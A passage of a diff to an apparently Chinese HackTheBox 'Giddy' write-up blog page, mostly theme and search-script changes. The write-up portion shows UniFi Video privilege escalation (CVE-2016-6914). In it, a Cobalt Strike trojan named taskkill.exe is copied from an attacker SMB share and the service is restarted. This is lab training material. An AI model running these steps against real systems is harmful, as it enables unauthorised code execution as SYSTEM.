 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">searchsploit unifi video					#searchsploit是一个用于搜索和利用已知漏洞的命令行工具，而&quot;unifi video&quot;是指Ubiquiti Networks的一个视频监控软件。通过在命令行中运行searchsploit unifi video，您可以搜索与Unifi Video相关的已知漏洞。<br><br>searchsploit -m 43390.txt					#这个命令使用searchsploit工具并结合-m选项，用于将特定漏洞的详细信息显示在终端上。43390.txt是一个漏洞编号或漏洞描述文件的示例。<br><br>cat 43390.txt					#cat命令用于查看文件的内容，而43390.txt是一个文件名的示例。<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451708.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451709.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451708.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451709.png" alt="img"></p>
 <p>Ubiquiti UniFi Video中存在本地提权漏洞。本地攻击者可利用该漏洞以提升的权限执行任意代码。漏洞编号为CVE-2016-6914，在UniFi Video运行时会在目录 C:\ProgramData\unifi-video 下运行一个 taskkill.exe ，并提权，利用方式即为在目录下上传一个名为 taskkill.exe 的木马，再重启UniFi Video。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451710.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451710.png" alt="img"></p>
 <p>cs生成一个exe木马，利用impacket-smbserver上传到靶机，再关闭开启Ubiquiti UniFi Video服务</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">copy \\10.10.14.15\Share\taskkill.exe taskkill.exe<br>Stop-Service &quot;Ubiquiti UniFi Video&quot;<br>start-service unifivideoservice<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451711.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451712.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451713.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451711.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451712.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451713.png" alt="img"></p>
 <p>找到第二个flag:4d9456312a4bbb1fab9a3e9f48956532</p>
-<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451714.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/076w/Image@pic/notes/202402221451714.png" alt="img"></p>
 
-                
-              </div>
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
             
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/%E7%AC%94%E8%AE%B0/" class="category-chain-item">笔记</a>
-  
-  
-    <span>></span>
-    
-  <a href="/categories/%E7%AC%94%E8%AE%B0/%E9%9D%B6%E5%9C%BA/" class="category-chain-item">靶场</a>
-  
-  
-    <span>></span>
-    
-  <a href="/categories/%E7%AC%94%E8%AE%B0/%E9%9D%B6%E5%9C%BA/HackTheBox/" class="category-chain-item">HackTheBox</a>
-  
-  
-    <span>></span>
-    
-  <a href="/categories/%E7%AC%94%E8%AE%B0/%E9%9D%B6%E5%9C%BA/HackTheBox/Machines/" class="category-chain-item">Machines</a>
-  
-  
-
-  
-
-  
-
-  
-
-      </span>
-    
-  
-</span>
-
-    </div>
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/HackTheBox/" class="print-no-link">#HackTheBox</a>
-      
-    </div>
-  
-</div>
-
-
-              
-  
-
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>Giddy_Medium</div>
-      <div>http://syst1m.cn/2023/10/24/Giddy_Medium/</div>
-    </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>作者</div>
-          <div>076w</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>发布于</div>
-          <div>2023年10月24日</div>
-        </div>
-      
-      
-      
-        <div class="license-meta-item">
-          <div>许可协议</div>
-          <div>
+              <a href="/2023/10/11/Busqueda_easy/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
             
-              
-              
-                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
-                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
-                    <i class="iconfont icon-by"></i>
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2024-02-22 14:53:13
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/HackTheBox/" title="HackTheBox">
+                        #HackTheBox
+                      </a>
+                    </span>
+                    
                   </span>
-                </a>
               
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2023/11/03/Clicker_Medium/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
             
           </div>
         </div>
       
     </div>
-    <div class="license-icon iconfont"></div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Giddy-Medium"><span class="toc-text">Giddy_Medium</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-text"></span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B"><span class="toc-text">漏洞探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-text">权限提升</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
   </div>
 
 
-
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/076w">
+                <i class="iconfont icon-github"></i>
+              </a>
               
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2023/11/03/Clicker_Medium/" title="Clicker_Medium">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Clicker_Medium</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2023/10/11/Busqueda_easy/" title="Busqueda_easy">
-                        <span class="hidden-mobile">Busqueda_easy</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
-
+        </li>
+        
+        <li>
+          
+            <a title="email" href="mailto:admin@syst1m.cn">
+              <i class="iconfont icon-envelope"></i>
+            </a>
             
-          </article>
-        </div>
-      </div>
-    </div>
-
-    <div class="side-col d-none d-lg-block col-lg-2">
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
       
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header">
-    <i class="iconfont icon-list"></i>
-    <span>目录</span>
-  </p>
-  <div class="toc-body" id="toc-body"></div>
+        <a target="_blank" rel="noopener" href="https://github.com/076w">Copyright © 2024 076w</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+    <div class="footer-views">
+      
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+      
+          本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+        
+      
+          本站访客数<span id="busuanzi_value_site_uv"></span>人
+        
+      
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
 </div>
 
 
+<script src="/js/backtotop.js"></script>
 
-  </aside>
 
 
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
     </div>
   </div>
-</div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
 
 
 
 
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
 
   
+<script src="/js/colorscheme.js"></script>
 
 
 
+
+
+        
   
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
       </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Giddy_Medium + '&url=' + http%3A%2F%2Fsyst1m.cn%2F2023%2F10%2F24%2FGiddy_Medium%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://syst1m.cn/2023/10/24/Giddy_Medium/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
       </div>
     </div>
-  </div>
-</div>
-
-    
-
-    
-  </main>
-
-  <footer>
-    <div class="footer-inner">
   
-    <div class="footer-content">
-       <a href="https://www.yuque.com/076w" target="_blank" rel="nofollow noopener"><span>076w</span></a>
+  
+<script src="/js/shares.js"></script>
 
+
+
+      </div>
     </div>
-  
-  
-    <div class="statistics">
-  
-  
-
-  
-    
-      <span id="busuanzi_container_site_pv" style="display: none">
-        总访问量 
-        <span id="busuanzi_value_site_pv"></span>
-         次
-      </span>
-    
-    
-      <span id="busuanzi_container_site_uv" style="display: none">
-        总访客数 
-        <span id="busuanzi_value_site_uv"></span>
-         人
-      </span>
-    
-    
-  
-</div>
-
-  
-  
-  
-</div>
-
-  </footer>
-
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
-
-
-
-
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init(Object.assign({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      scrollSmooth    : true,
-      includeTitleTags: true,
-      headingsOffset  : -boardTop,
-    }, CONFIG.toc));
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('tocbot' in window) {
-        tocbot.refresh();
-        var toc = jQuery('#toc');
-        if (toc.length === 0 || !tocbot) {
-          return;
-        }
-        if (toc.find('.toc-list-item').length > 0) {
-          toc.css('visibility', 'visible');
-        }
-      }
-    });
-  });
-</script>
-
-
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('anchors' in window) {
-        anchors.removeAll();
-        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-        var res = [];
-        for (var item of el) {
-          res.push('.markdown-body > ' + item.trim());
-        }
-        if (CONFIG.anchorjs.placement === 'left') {
-          anchors.options.class = 'anchorjs-link-left';
-        }
-        anchors.add(res.join(', '));
-      }
-    });
-  });
-</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script  src="/js/local-search.js" ></script>
-
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
-
-
-
-
-
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
-
-
-  
-
-  <noscript>
-    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
-  </noscript>
-</body>
+  </body>
 </html>
